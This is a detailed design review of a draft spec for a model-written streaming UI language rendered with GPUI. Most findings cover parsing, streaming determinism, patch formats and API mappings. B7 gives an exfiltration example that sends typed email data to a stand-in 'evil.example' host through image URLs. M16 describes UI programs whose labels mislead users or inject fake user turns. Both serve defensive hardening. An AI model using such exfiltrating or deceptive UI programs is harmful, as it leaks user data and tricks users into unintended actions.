# Review of SPEC.md (draft 0.1, phase 1)

> **Status: all findings addressed in SPEC.md draft 0.2.** Appendix C of SPEC.md maps each finding to its resolution. Line numbers below refer to the archived draft, `spec/archive/SPEC-v0.1.md`.

Scope: I read all of `spec/SPEC.md`, `research/reports/openui-report.md` and `research/reports/chatgpt-ui-report.md`. I did not open `research/openui/`. Line numbers refer to SPEC.md as it stood on 2026-10-21.

Method:

- I parsed every DSL example in the spec by hand against the EBNF in 2.5 and the lexical table in 2.2. The per-example results are in Appendix 1.
- I built streaming counterexamples by comparing arrival order with batch order for every rule that depends on order.
- For GPUI and gpui-kit I used live sources, not memory:
  - crates.io API: `gpui-kit` 0.8.0, published 2026-10-19. It depends on `gpui-pre =0.3.9`, `gpui-base ^0.8.0` and `gpui-component ^0.8.0` (optional).
  - docs.rs: `gpui-component` 0.8.0 item list, and `gpui-pre` 0.3.9 (`Styled`, `Window`, `AnyView`, `ImageSource`, the item list).
  - The gpui-kit README.
  - Anything I could not confirm is marked "unverified".

Severity scale:

- **Blocker**: an implementer cannot proceed without a decision, or a core invariant (I1-I7, G1-G8, goal 3) is false as written.
- **Major**: wrong or missing behavior that would cause rework or a visible defect.
- **Minor**: a local inconsistency or an under-specified detail.
- **Nit**: wording or naming.

Counts: 9 Blocker, 27 Major, 25 Minor, 14 Nit.

---

## Blocker

### B1. The header is not lexable or parseable as specified, and a missing header makes the extractor drop the whole program (2.2 l.170-172, 2.5 l.226-227, 2.8 l.316-328, 2.9 l.336-338)

- **Grammar.** `attr = IDENT "=" (IDENT | STRING | INT | version)` has these defects:
  - `version` is never defined.
  - `=` is not a token (only `:=` and `==` are).
  - `@` is not a token, so the lexer emits `syntax.bad_token` and skips it.
  - `0.1` lexes as FLOAT.
  - `lib=std@0.1` from every example therefore lexes as `IDENT bad_token IDENT bad_token FLOAT`.
- **Header detection.** The header token is defined as "first two bytes `%u`", but `%` is also the remainder operator.
- **Missing header.** 2.8 says a missing header gives a warning and the first line is treated as a statement. But 2.9 enters `Program` state only on a column-0 `%ui` line or a ```` ```ui ```` fence.
  - Counterexample: an unfenced reply `root := Vert([...])` with no header is classified as prose, so nothing renders and no `syntax.header_missing` is ever emitted.
  - Models drop the header often (see M20), so this is the common failure path, not an edge case.
- **Fix.**
  - Give the header its own line-level micro-grammar, outside the expression lexer: `header = "%ui" SP major { SP key "=" value } ; key = [a-z]+ ; value = [A-Za-z0-9_.@+-]+`, parsed by a dedicated routine on the first line only.
  - Amend 2.9.1: "In `Prose` state, a column-0 line matching the statement-start pattern (2.4), or starting with `%ui`, switches to `Program` state at that line."
  - Also see M20 (make the header optional).

### B2. Order-dependent budgets and cycle cutting break I2 and I3 (streamed == batch) (2.10 l.345, 4.3 `name.cycle` l.598, 7.1 `fuel_per_pass` l.863, `max_nodes`)

Streaming materializes statements in seal order, which is text order. Batch materializes in tree order from `root`. Any rule whose result depends on materialization order gives different results in the two modes.

- **Expansion budget.**
  - Program: `root := Vert([big1, big2])`, then `big2 := ...`, then `big1 := ...`. Each expands to 6,000 nodes, and `max_expanded_nodes` is 10,000.
  - Streaming seals `big2` first, so it gets 6,000 nodes and `big1` is truncated. Batch walks `root` → `big1` first, so `big2` is truncated.
  - The IR and the `limit.expansion` diagnostics (which statement) differ.
- **Fuel per pass.** Batch evaluates every prop in one pass under the 200,000 budget. Streaming evaluates many small dirty sets, each under the budget.
  - A program that needs 250,000 total fuel hits `limit.fuel` in batch and never in streaming.
- **Cycles.** "The closing edge is dropped" depends on traversal order.
  - Program: `root := Vert([a, b])`, `b := Vert([a])`, `a := Vert([b])`.
  - Streaming: `b` seals with `a` unresolved. When `a` seals, the new edge `a→b` closes the cycle and is dropped.
  - Batch DFS: root→a→b→a closes on `b→a`. Different tree.
- **Fix.**
  1. Define cycles per instantiation path, not per statement graph. Replacement text for `name.cycle`: "When instantiating a reference to statement S while S is already on the current instantiation path (an ancestor), that reference is omitted from its slot and `name.cycle` is reported at that path." This depends only on the final tree path, so it is order-independent.
  2. Define every count-type budget as allocated in canonical pre-order DFS from `root` over the final statement table. While streaming, allocation is recomputed and nodes already shown MAY be removed. They are not sealed statements, so I1 is not violated, but say so explicitly. Alternatively, make the budget per-reference (each reference gets at most `max_expanded_nodes / max(1, refs)`), which is local and order-free.
  3. Delete `fuel_per_pass`. Keep `fuel_per_prop`, which is deterministic per prop. Bound the total with `max_expanded_nodes × fuel_per_prop`, or with a per-program fuel total computed in canonical order at `finish()`.
  4. Add a conformance property: for every limit, the fixture is run with the referenced statements permuted in text order.

### B3. NodeId paths collide (5.2 l.698-718)

- **Collision 1.** The same reference twice in one slot is legal (2.10 creates one instance per use): `Vert([sep, body, sep])`. Both `sep` instances get the path `root/children:sep`.
- **Collision 2.** Inline index keys and `each` keys share a namespace. In `Vert([Para("hi"), each(xs, |x| Para(x.t), key: |x| x.n)])`, an element with key `0` and the inline `Para` both render as `children:0`. The spec's own example `children:row=1042` does not match its rule ("the each key rendered as text"). Two `each` calls without keys in one slot both produce `#0`, `#1`, and so on.
- **Collision 3.** Keys come from data, which may be host or tool data, and are not escaped. A key containing `/` or `:` can forge another node's path.
  - For example, the key `"x/children:y"` produces the path of a different node.
  - The same problem lets keys collide on purpose; xxhash is not collision-resistant, but path injection does not even need a hash collision.
- **Unclear index.** "Index within the slot" does not say whether it is the source index or the index after recovery drops (4.4 step 5).
- **Effect.** G2, G3 and G6 fail (two Inserts with the same id), and focus and entities are shared wrongly.
- **Fix.** Replace the key list with:

  > `<key>` is one of: `@<name>` for a reference, with `@<name>~<k>` for its k-th repeat (k ≥ 2, counted in source order within the slot); `#<i>` for an inline child at **source** position i in the slot's list literal; `e<i>:<escaped key>` for an element produced by the `each` at source position i, where `<escaped key>` percent-encodes `/`, `:`, `%` and `~` and is prefixed by the key's type tag (`s` string, `n` integer); `e<i>#<j>` for an unkeyed `each` element j. Paths are compared as strings; the 64-bit hash is a cache key only, and a hash collision with a different path string is resolved by rehashing with a salt, not by dropping the node.

  Also remove `limit.ir_depth` as the collision class. A collision is not a depth problem.

### B4. Most of the standard library has no signatures, and the examples break their own calling convention (2.11, 2.15, 4.6, 8.1, 10.3)

- **Missing signatures.** Only `Button`, `TextField`, `Chart` and `Vert` have signatures. The other 26 components in 10.3 have no argument lists, types, slots, roles or defaults. These include `Panel`, `Tiles`, `DataTable`, `Column`, `Tabs`/`Tab`, `Choice`, `Radios`, `Checks`, `Items`, `Picture`, `Callout`, `Md`, `Code`, `Progress`, `Range`, `Foldout`, `Glyph`, `Gap` and `Rule`.
- **Impact.** Without these, nobody can write the P4 catalog, the `std-min` fixtures, the GPUI builders, or the 2.15 examples' expected IR.
- **Conflicts in the examples:**
  - `Chart.data` is a non-`Option` field in 8.1, so it is required and positional. The dashboard writes `data: sales`, which raises `schema.required_by_name` (info).
  - 5.4 says `Picture`'s `alt` is required, but example 2 writes `alt: p.name`.
  - The `%diag` example (l.657) reports `schema.missing_required ... arg=rows`, so `rows` is required. Its own hint, `DataTable(columns: Column[]; rows, ...)`, puts `rows` after `;`, which in the P4 format means optional. The dashboard passes `rows:` by name.
  - 2.11 uses `Table(...)`, but no `Table` component exists (it is `DataTable`).
- **Fix.**
  - Add a normative section "8.8 Standard library, phase 1" with one signature line per component in the P4 format. Include role, slots and accepted children, enum values, token props, and the `to_text` template.
  - Then make every example match it. Either make `data`, `alt` and `rows` positional in the examples, or make them optional in the signatures.
  - Add a CI rule: every fenced `ui` block in SPEC.md is extracted and must validate with zero diagnostics of severity Info or higher, unless it is tagged `ui-invalid`.

### B5. The patch wire format is unspecified, yet `expect.patches.json` compares it exactly (6.2 l.776-793, 6.5 l.811-821, 12.2 l.1425)

The JSON example does not match the Rust types:

- `NodeId` is a `u64` hash (5.2), but it serializes as the path string `"n:root/children:filters"`, with an `n:` prefix that appears nowhere else.
- `props` is `Vec<(PropId, Value)>`, which default serde turns into an array of pairs. The example shows a JSON map.
- `kind` is a `ComponentId` index, but the example shows `"Horiz"`.
- `NodeInit.a11y` is missing from the example.
- `Value` has `Int` and `Float`, but JSON `2` against `2.0` round-trips only if the encoder preserves the distinction. The spec does not require it.
- No encoding is given for `Duration`, `Ref`, `Token`, `Binding`, `Action(ActionPlanId)`, `Validator`, `Role::Heading(u8)` or `SlotName`.
- `Op` has `#[serde(tag = "op")]`, but `Reset` is a unit variant, so the encoding needs stating.

**Fix.** Add a normative "6.5.1 JSON encoding" table:

- `NodeId` is the path string (B3).
- `kind` is the component name.
- `props`/`set` is a JSON object keyed by prop name.
- `Value` uses tagged forms for everything except Null, Bool and Str. For example `{"i":2}`, `{"f":2.0}`, `{"dur_ms":5000}`, `{"ref":"t4.places"}`, `{"tok":["space",3]}`, `{"bind":"$x"}`, `{"action":17}`, `{"validator":"email"}`. Alternatively, define Int as a JSON integer and Float as always written with `.` or an exponent.
- `role` is snake_case, with `{"heading":2}` for Heading.
- Unit ops are written `{"op":"reset"}`.

Then delete the binary-format paragraph (see the deferral list).

### B6. Mixed `each` and literal children, and `null` children, are unspecified (2.11 l.358, 2.7 `each`, 4.4)

- `Vert([Heading("x"), each(rows, |r| Para(r.name))])` is the most common list pattern. `each` returns a list, so the slot receives `[Node, List<Node>]`. The spec does not say whether that is flattened or is `schema.slot_kind`.
- `Vert([title, if($show, details, null)])` is the only way to render conditionally. A `Null` child is not covered: 4.4 drops a "dropped child", but `null` is not a dropped child.
- Without a rule, implementations will disagree on the most common shapes.
- **Fix.** Add to 2.11: "A slot value is flattened one level: list elements that are themselves lists (from `each`, `map`, `filter`, or a list-valued reference) are spliced in place. `null` elements are skipped silently (no diagnostic). Deeper nesting is `schema.slot_kind`." Add an `iteration` fixture for each of these shapes.

### B7. Model-written image URLs leak data with no user gesture (11 URL abuse l.1384, 10.3 `Picture` l.1311, 2.6 `++`)

- `Picture("https://evil.example/p.png?d=" ++ $email, "logo")` is a valid program. Whenever `$email` changes (each keystroke, debounced or not), the renderer fetches a new URL.
- This sends typed user data to an arbitrary host. It needs no click, no tool and no host-policy check. The UrlPolicy in 11 allows `https` by default.
- This breaks goal 3 and the "data exfiltration" row of 11.
- `!open` and `LinkButton` have the same flaw. They need a gesture, but the URL is computed silently.
- **Fix:**
  1. `UrlPolicy` default: images load only from host-provenance values (refs or tool results), or from a host allowlist. Model-literal image URLs are off by default.
  2. Taint: any string derived from `$state`, a query result, or `ref` data is tainted. URL-typed props (`Picture.src`, `!open`, `LinkButton`) reject tainted strings that were combined with literals (`expr.tainted_url`). A whole host-provenance URL is still allowed.
  3. Never pass a model-supplied URL to `gpui::img()` directly. `ImageSource::Resource(Uri)` fetches through the App HTTP client and bypasses policy. Have the host fetch and hand over bytes through `ImageSource::Image(Arc<Image>)` or `ImageSource::Custom(loader)` (both verified in gpui-pre 0.3.9).

### B8. Edit mode cannot keep NodeIds, focus or typed text, because each reply is a new Session (9.5 l.1231-1245, 10.1 l.1256, 13 `Mode::Patch`, M8 l.1590)

- `UiView` "renders one message's program", and `SessionOptions.mode = Patch { base }` creates a new Session.
- 9.5 promises that "nodes at the same path keep their NodeId; the diff against the previous resolved tree yields SetProps", and M8 promises that "typed text survives edit-mode redefinition".
- Both need the patch applied to the **existing** session and view. A new session starts a new epoch with `Reset`, which discards entities, focus and `InputState`.
- The free function `merge_patch(base, patch, lib)` returns only text.
- **Fix.**
  - Replace `Mode::Patch { base }` with `Session::begin_edit(&mut self) -> EditStream` that accepts `push`/`finish`. On finish it merges into the live program and emits a normal non-Reset `PatchBatch` on the same epoch.
  - Define where the edit reply's UI appears (in place of the base message). Store the reply as a patch record that points at the base message id.
  - Keep `merge_patch` for offline use.

### B9. The renderer trait and the GPUI API cannot be implemented with gpui-pre 0.3.9 and gpui-kit 0.8 (10.1 l.1258-1261, 13 `Renderer` l.1553-1561)

- Kit stateful widgets need `&mut Window` to construct:
  - `SelectState::new(delegate, selected, window, cx)` (verified).
  - `InputState` and `TextareaState` (the 0.8 split; exact `new` signature unverified, but historically `new(window, cx)`).
  - `SliderState`, `ListState`, `TableState`.
- `UiView::apply(&mut self, batch, cx: &mut Context<Self>)` has no `Window`, so an `Insert` of a `TextField` cannot create its state during apply.
- `Renderer::apply(&mut self, batch)` has neither App nor Window, so a GPUI `Entity` cannot implement it.
- `set_event_sink(Box<dyn Fn(UiEvent) + Send>)` requires `Send`, but GPUI views live on the foreground thread and their closures capture `!Send` handles.
- **Fix.**
  - Make the core "renderer trait" a plain data contract (`PatchBatch` in, `UiEvent` out) and drop the trait object.
  - In `-gpui`: `fn apply(&mut self, batch: &PatchBatch, window: &mut Window, cx: &mut Context<Self>)`. Alternatively, queue the batch and apply it lazily in `render`, where `Window` is available.
  - Create kit state entities lazily on first render of a node.
  - Drop `Send` from the sink and deliver events with `cx.emit` / `EventEmitter<UiEvent>`.

---

## Major

### M1. Trailing-operator continuation at depth 0 consumes the next statement, including `root` (2.4 l.208-213)

- Resync applies only when bracket depth is above zero.
- Counterexample:

  ```
  total := a +
  root := Vert([x])
  ```

  The `+` keeps the statement open, and the depth-0 line `root := ...` is not a resync point. The statement becomes `total := a + root := Vert([x])`, which fails to parse and is dropped, so `root` is gone and `name.no_root` is fatal.
- A model that stops mid-expression and starts a new line does exactly this.
- **Fix.** Reword rule 2.4: "Resync rule: a line that starts at column 0 and matches the statement-start pattern terminates the open statement **whenever the statement is open for any reason** (open bracket or trailing operator)."

### M2. "Last token on the line" makes blank lines, comment lines and a split CR LF end statements, so stream and batch diverge (2.2 l.155, 2.4 l.208, l.217)

- **Counterexample, blank line:** `a := 1 +` NL NL `2`. The blank line has no "last token", so condition 2 holds and the statement ends at `1 +`. A comment-only line between continuation lines does the same.
- **Counterexample, streaming:** chunk 1 ends `... +\r` and chunk 2 starts with `\n2`.
  - If a lone CR is normalized to LF at once, streaming sees `+ LF LF 2`, a blank line, so the statement ends.
  - Batch sees CR LF as one LF, so the statement continues.
  - I2 fails.
- **Fix:**
  - Condition 2 becomes: "the last **significant** token of the open statement (ignoring blank and comment-only lines) is not a binary operator, `,`, `:` or `:=`."
  - Add to 3.1: "A trailing CR at the end of a chunk is held back until the next byte or `finish()`."
  - Hold back a partial `%ui` or a fence line until the line is decided, as well.

### M3. A forward reference to state gives final diagnostics while streaming that batch never gives (2.12 l.368, 3.7 l.527-529)

- Program: `f := TextField("Name", bind: $name)` followed by `$name := ""`.
- In batch, `$name` is declared, so there is no diagnostic.
- While streaming, `f` seals first. That raises `state.undeclared` (Error, not in the provisional list) and `schema.bind_target`, and the binding is dropped.
- Diagnostics emitted during streaming that do not appear in batch break I2 as the conformance runner checks it. It also creates an observable UI difference.
- **Fix.** Add to 3.7: "`state.undeclared`, `schema.bind_target` and `schema.slot_kind` when caused by a not-yet-sealed name; `limit.*` count limits (see B2)." Also state that a binding re-attaches when the declaration seals.

### M4. Keywords cannot be map keys or argument names, and lowercase-only IDENT blocks camelCase data access (2.2 l.161, l.171; 2.5 l.253, l.259)

- `pair = (IDENT | STRING) ":" expr` and `named = IDENT ":" ...`, and `query`, `remove`, `tool`, `not`, `and` and `or` are keywords.
- Counterexample: `query hits := tool("search.web", {query: $q}, default: [])` is a syntax error, and `query` is the most common search-tool argument name.
- IDENT is `[a-z_][a-z0-9_]*`, so `p.photoUrl` lexes as `p . photo` followed by COMP `Url`. Host JSON is very often camelCase (`createdAt`, `imageUrl`), and the model cannot use `.` on it.
- **Fix:**
  - Make `query`, `mutate`, `remove` and `tool` **contextual**: keywords only at statement start, or `tool` only directly after `:=` in a query or mutate statement.
  - After `.`, as a map key, and as a named-argument name, accept `[A-Za-z_][A-Za-z0-9_]*` including keywords.
  - Keep statement names and lambda parameters lowercase.

### M5. Trailing tokens after a complete expression, non-associative comparison, and mismatched closers are undefined (2.5 l.241, 2.4 l.207)

- `x := a < b < c`, `x := Foo() Bar()` and `x := 1 2` all leave tokens after a complete `expr`. The spec does not say whether the statement is dropped, truncated, or gets a comma inserted. `syntax.missing_comma` is defined only "when the next token starts an expression", and only inside lists or arguments.
- A mismatched closer is also undefined: `Foo([a)` has `)` at the top while the stack top is `[`. Depth counting depends on this, and depth decides statement boundaries.
- **Fix:**
  - "Tokens after a complete statement expression: the statement is kept up to the end of the expression; the rest is skipped with `syntax.trailing` (Warning)."
  - "Closer that does not match the innermost opener: if it matches an opener further out, pop to it (auto-closing the inner ones, `syntax.unclosed_bracket`); otherwise ignore it (`syntax.stray_closer`)." Rust's parser and most tolerant parsers do this.

### M6. A message can hold several program segments, but there is one symbol table (2.9 l.338, 3.2)

- The extractor allows several programs per message and renders "the last complete one". The parser has one `symbols` map, and "first definition wins".
- Counterexample: segment 2 redefines `root`, so `name.duplicate` fires and segment 1 keeps rendering. Alternatively the parser restarts, and then it is unclear whether patches Reset.
- During streaming, segment 1 is shown until segment 2 completes at end of stream. The UI then swaps wholesale, which is not "streamed equals batch" in spirit.
- **Fix.** Either allow one program per message in phase 1 and treat later fences as prose (simplest), or "each program segment has its own parser and IR; starting a new segment does not change the displayed tree until the new segment's `root` seals, at which point the session emits `Reset` + inserts in a new epoch."

### M7. Edit-merge corner cases are undefined (9.5 l.1235-1245, 7.2 l.886, 2.5 l.234)

- **`remove $x`.** 7.2 says `remove $x` deletes a state slot, but the grammar is `remove = "remove" IDENT {"," IDENT}`, so `$x` is not accepted. Fix: `remove = "remove" target {"," target}; target = IDENT | STATE`.
- **GC reachability.** Reachability is undefined over action targets.
  - Counterexample: `mutate close := ...` and `done := Button("Close", on_click: !run(close))`. If reachability follows only node slots, `close` is garbage-collected and the button breaks.
  - `fallback := "..."` is never reachable, so it is GC'd on every edit.
  - Fix: "Reachability follows every name reference in any expression, including action targets (`!run`, `!set`), `bind:` targets, query/mutate args, and the reserved `fallback` statement."
- **`remove a` and `a := ...` in one patch.** The textual-order rule does not say whether `a` returns to its old position or is appended. Fix: "a removal followed by a definition is a replacement in place."
- **Duplicates in the base.** The base may contain duplicate statements (later ones dropped) or invalid ones. Specify that replacement targets the effective (first) definition and that dropped duplicates are deleted by the merge.
- **State type change.** If the patch changes `$range := "7d"` to `$range := 7` and the slot is user-modified with a `Str`, say whether the value resets or the type change is rejected. Proposed: "if the new default's type differs, the value is reset to the new default regardless of origin, with `state.type_changed` (Info)."
- **Canonical regeneration.** Say "replaced statements are substituted verbatim (their source text spans, including comments), never pretty-printed", so the model sees its own text again.
- **Patch preview while streaming.** 9.5 step 3 shows a preview, but a patch alone has no `root`, so `name.no_root`. Define the preview as "base IR with provisional replacements applied per sealed patch statement; removals are not previewed."

### M8. The 2.13 form example is invalid under its own rules, and `submit: true` outside a `Form` is undefined (2.13 l.377-385, 2.15 l.446-452)

- `TextField("Name", bind: $name, ...)` and `bind: $email` are never declared. 2.12 says undeclared state is never auto-declared, so `state.undeclared` and `schema.bind_target` fire.
- The laptop example has `Button(..., submit: true, ...)` inside a `Panel`, not a `Form`, so "every field in the enclosing form" has no referent.
- **Fix:**
  - Add `$name := ""` and `$email := ""` to 2.13.
  - Add to 2.13: "`submit: true` outside any `Form` gates on the page scope (all page-scope fields)."
  - Alternatively, wrap the laptop example in `Form`.

### M9. Value types are inconsistent and many referenced types are undefined (2.6 l.276, 5.5 l.749-754, 7.2 l.877-879, 4.2, 13)

- **Node values.** 2.6 lists `Node` and `Action` as values, but `enum Value` (5.5) has no `Node` variant. So `if(c, Para("a"), Para("b"))` and `each(...)` have no runtime representation.
- **Duplicate names:**
  - `Slot` is defined twice: the IR slot (5.1) and the state slot (7.2).
  - `Origin` is defined twice: state origin (7.2) and request origin `Origin::UserGesture` (7.3, 7.4).
  - `Phase` is defined twice: diagnostic phase (4.2) and session phase `AwaitingHeader | Streaming | Done | Rejected` (13).
- **Undefined types:** `Text`, `Space`, `Align`, `Data<T>`, `Table`, `FieldKind`, `ChartKind`, `A11y` (fields), `Span`, `DataShape` (grammar), `RefCatalog`, `Limits`, `UrlPolicy`, `HostError`, `PolicyDecision`, `ToolUse`, `ProgramId`, `ParseResult`, `MergeResult`, `StateKey`, `TargetId`, `TokenValue`, `FieldError.message_key`.
- **Empty-list defaults.** `$use := []` has no element type (7.2 only covers `null`).
- **Fix:**
  - Add `Value::Node(NodeInstanceId)`, or keep node values out of `Value` with a separate `Eval = Value | Nodes(Vec<NodeTemplate>)`.
  - Rename to `IrSlot`/`StateSlot`, `StateOrigin`/`RequestOrigin`, and `DiagPhase`/`SessionPhase`.
  - Add an appendix that defines every type named in the API.
  - Typing rule: "an empty list default takes its element type from the first binding or write; until then it is `list<any>`."

### M10. The `Recovery` enum is incomplete, but fixtures compare `recovery` (4.2 l.575, 4.3, 12.2 l.1424)

The table uses these outcomes, and none is a `Recovery` variant:

- comma inserted;
- fallback applied;
- clamped;
- binding dropped;
- rule omitted;
- edge dropped (cycle);
- string ended at line end;
- replacement char used;
- "Last good props reused".

12.2 compares the multiset `(code, stmt, path, recovery)`, so fixture authors cannot write `expect.diag.json`.

**Fix.** Add the variants `CommaInserted`, `FallbackApplied`, `Clamped`, `BindingDropped`, `RuleOmitted`, `RefOmitted`, `Truncated`, `Replaced`, `LastGoodKept`, `Ignored`. Then make every row of 4.3 name exactly one variant.

### M11. Diagnostic codes are missing or in the wrong class (4.3)

- **Used but not defined:**
  - `schema.dup_key` (5.2);
  - `schema.a11y_missing` (5.4);
  - the "GC is reported as info" code (9.5);
  - the orphaned state slot (7.2);
  - the info diagnostic for an unknown header attribute (2.8);
  - a different library major, which is "an error" (2.8) but has no code; `lib.mismatch` is a Warning;
  - "patch result has no root";
  - `max_string_bytes`, `max_state_bytes` and `max_event_bytes` overflow;
  - `min_items` underflow.
- **Wrong class:** a hash collision is filed as `limit.ir_depth`.
- **Fix.** Add `schema.dup_key`, `schema.a11y_missing`, `edit.gc`, `edit.no_root`, `state.orphaned`, `syntax.header_attr`, `lib.major_mismatch`, `limit.string`, `limit.state`, `limit.event`, `schema.min_items`, `limit.queries` (M24) and `syntax.trailing` (M5).

### M12. Model feedback includes data-dependent `Expr` errors and is not deterministic (4.6 l.662-667)

- `expr.div_zero`, `expr.index_oob` and `expr.type` often come from query or ref data, not from the text. Their timing depends on when results arrive after `finish()`.
- Feeding them to the model blames the model for host data and makes the `%diag` block non-reproducible, which contradicts "prompts that include it are reproducible".
- **Fix.** "Feedback includes only diagnostics produced by `parse_batch` + validation + evaluation with every query at its `default` and every ref unresolved. Runtime evaluation diagnostics after delivery are excluded."

### M13. The GPUI mapping table has wrong or unverifiable names (10.3)

Checked against gpui-component 0.8.0 on docs.rs and gpui-pre 0.3.9. ✓ means the name is confirmed.

| # | Spec says | Status | Correct target in gpui-kit 0.8 / gpui-pre 0.3.9 |
| --- | --- | --- | --- |
| 1 | `div().flex().flex_col()/flex_row()` | ✓ | Also kit helpers `v_flex()` / `h_flex()`. |
| 2 | `div().grid()` with `cols` | ✓ `grid`, `grid_cols`, `col_span` exist on `Styled` | "Responsive column count clamps to width" has no CSS media query. You must measure bounds (kit `measure`/`measure_if`, or a canvas pass) and choose `cols` yourself. |
| 4 | "kit Divider" | ✗ | `separator::Separator` (with `SeparatorStyle`). |
| 5 | "kit card-style container" | ✗ (no `Card`) | `group_box::GroupBox` (with `GroupBoxVariant`), or a styled `div`. |
| 6 | "kit Label" | ✓ `label::Label` | Heading sizes are a styled `div().text_xl()` etc. |
| 8 | "kit Markdown / TextView" | ✓ | `text::TextView::markdown(id, text)`, or `TextView::new(&Entity<TextViewState>)` for streaming (`push_str`/`set_text` mentioned in the docs). The kit's markdown AST has `Math`/`InlineMath`, so "Math is out of phase 1" may be a choice, not a limitation (unverified whether it renders). |
| 9 | "kit highlighted code view (tree-sitter) with copy button" | ✗ (no standalone code view) | Use `TextView::markdown` with a fenced block, or `input::Editor` read-only in code mode with `highlighter::SyntaxHighlighter`. Copy is `clipboard::Clipboard`. tree-sitter is an optional dependency (unverified which feature). |
| 10 | "kit Badge / Tag" | Partly wrong | `badge::Badge` is a count, dot or icon *indicator attached to an element*, not a status label. Use `tag::Tag` (`TagVariant`). |
| 11 | kit Button | ✓ `button::Button` | `ButtonVariant` = Default, Primary, Secondary, Danger, Info, Success, Warning, Ghost, Link, Text, Custom. Map tone primary→Primary, quiet→Ghost (or Default), danger→Danger. |
| 12 | Button link variant | ✓ `ButtonVariant::Link` | `link::Link` also exists. |
| 13 | kit Input | ✓ `input::Input::new(&Entity<InputState>)` | No `masked`/`password` builder on `Input`. `mask_toggle()` and `content_type(...)` exist. Masking setup on `InputState` is unverified. |
| 14 | "kit Input (multiline)" | ✗ | 0.8 split it out: `input::Textarea` + `TextareaState`. `InputState` is single-line only. |
| 15 | "kit Select / Dropdown" | Partly | `select::Select` + `SelectState::new(delegate: impl SearchableListDelegate, selected: Option<IndexPath>, window, cx)`. There is no Dropdown component (`DropdownButton` is a button with a menu). Needs the kit `Root` overlay layer. |
| 16-17 | Checkbox | ✓ `checkbox::Checkbox` | |
| 18 | "kit Radio group" | ✓ `radio::RadioGroup`, `radio::Radio` | |
| 19 | Switch | ✓ `switch::Switch` | Note that kit's `button::Toggle` is a different widget (a toggle button). |
| 20 | Slider | ✓ `slider::Slider` + `SliderState` (entity) | |
| 21 | "`div` with form context" | Available | `form::Form`, `form::Field`, `v_form()`. Use them for labels and error layout. |
| 22 | "kit List / virtual list" | ✓ `list::List` + `ListState` + `ListDelegate` | Also `VirtualList` / `v_virtual_list`, and gpui `uniform_list` / `list`. The kit List is delegate-driven, so an adapter is needed for IR children. |
| 23 | "kit Table (virtualized)" | ✓ `table::DataTable::new(&Entity<TableState<D>>)` with `D: TableDelegate` | Also a static `table::Table` family (`TableRow`, `TableCell`) for small tables. "Cells hold small nodes" is unverified. |
| 24 | "kit Tabs" | ✗ | `tab::TabBar` + `tab::Tab` render **only the bar**. Panel switching (selected index → which child is shown) must be built. There is no TabPanel. |
| 25 | kit Progress | ✓ `progress::Progress` (+ `ProgressCircle`) | "Indeterminate" support is unverified. |
| 26 | "kit Alert" | ✓ `alert::Alert` (`AlertVariant`) | |
| 27 | "kit chart module (bar, line, area, pie) … Axis, legend, tooltip" | Partly | `chart::{BarChart, LineChart, AreaChart, PieChart}` exist (plus Radar, Candlestick, Sankey). The API is `band`/`value` mappers, not `x`/`y`. **No legend method** on BarChart, and multi-series support is not documented. Tooltips exist. `y: ["revenue", "cost"]` and legends must be composed, for example several marks via the `plot` module, plus a hand-built legend row. Keep open question 14.2-3 open, but narrowed to "multi-series and legend". |
| 28 | GPUI `img()` | ✓ `gpui::img`, `ImageSource::{Resource, Render, Image, Custom}` | See B7: use `Image`/`Custom` with host-fetched bytes, never `Resource(Uri)` for model URLs. |
| 29 | "kit Accordion / Collapsible" | ✓ `accordion::Accordion`, `collapsible::Collapsible` | |
| 30 | "kit Icon from a fixed named set" | ✓ `Icon` + `IconName` enum (Lucide via the `gpui-kit-assets` feature) | |

GPUI and kit facts the spec should state:

- **Package name.** The package is `gpui-pre`, but the library name is `gpui` (`use gpui::...`). gpui-kit re-exports GPUI. Depend on `gpui-kit` and use its re-export, or pin `gpui-pre` to exactly the version gpui-kit pins.
- **Setup.** `gpui_kit::init(cx)` must be called first, and windows mount the kit `Root`, which provides the overlay layer for Select popups, tooltips and notifications. The spec mentions neither.
- **Entity APIs.** `Entity<T>`, `Context<T>`, `App`, `Window`, `FocusHandle`, the `Focusable` trait, `Render`, `RenderOnce`, `IntoElement` and `AnyElement` all exist. `Window::focus(&handle, cx)` takes `cx`. ✓
- **Text input.** GPUI itself has no text-input widget, only the input-handler infrastructure. The kit `Input` is the dependency. ✓ (The spec's assumption holds.)
- **Accessibility.** gpui-pre 0.3.9 exports `gpui::Role`, `A11yCallbacks`, `A11ySubtreeBuilder`, `AccessibleAction`, and `Window::is_a11y_active`/`on_a11y_action`, and it depends on accesskit 0.24. Kit `Input` has `aria_label`/`role`, and the kit has `RoleOverride`. The non-goal in 0.2 and open question 14.2-11 ("may need upstream changes") are out of date. Mapping IR `Role` to `gpui::Role` looks feasible in phase 1. How far each platform supports it is unverified.
- **Fix.** Replace the 10.3 "mapping" column with the right-hand column above, and add the setup facts to 10.1.

### M14. View caching does not work the way 10.1 and 10.6 say (10.1 l.1270, 10.6 l.1340, l.1346)

- "Parents re-render only when their child list changes, so unchanged siblings keep their cached elements and layout" is not GPUI's default.
- An `Entity<V>` child is re-rendered whenever its ancestor re-renders, unless it is embedded with `AnyView::cached(StyleRefinement)`. That API is verified in gpui-pre 0.3.9: it reuses the prior subtree if the entity was not notified, and `Window::refresh` bypasses it.
- `cached` also needs a fixed root style refinement for each child.
- One entity per node across 5,000 nodes is also heavy.
- **Fix:**
  - Say: "Container NodeViews embed child views via `AnyView::from(entity).cached(style)`. Leaf nodes without state or focus are `RenderOnce` elements built by their parent, not entities."
  - Mark the "no relayout of siblings" target as unverified, because GPUI recomputes taffy layout for non-cached subtrees every frame.

### M15. Syncing the store into the kit Input on every render will fight the cursor and loop on events (10.4 l.1321)

- "The input entity pushes `Edit` events and reads the store on each render." Kit `InputState` owns its text.
- Calling `set_value` every render resets the selection or IME state and fires `InputEvent::Change`, which writes the store, which re-renders: a loop.
- **Fix.** "The kit state is the source of truth while the field is focused. Store→widget sync happens only when the store's slot `rev` changes from a non-`User` origin (action, default, edit merge). Widget→store sync happens on `InputEvent::Change`, tagged with the node so the echo is ignored."

### M16. Mutations and `!say` can mislead the user, because labels are model-controlled (7.3, 7.4 l.928-930, 7.7 l.975, 11)

- "Mutations require a user gesture" protects little when the model writes both the label and the target: `Button("View details", on_click: !run(delete_all))`.
- `!say` puts model-chosen text into the next *user* turn, and the model will read it as user intent: `Button("Cancel", on_click: !say("Yes, transfer the funds"))`.
- **Fix:**
  - `Write` tools default to `AskUser`. The confirmation UI must show the tool's host-registered description and the evaluated args, rendered by the host and not by the program.
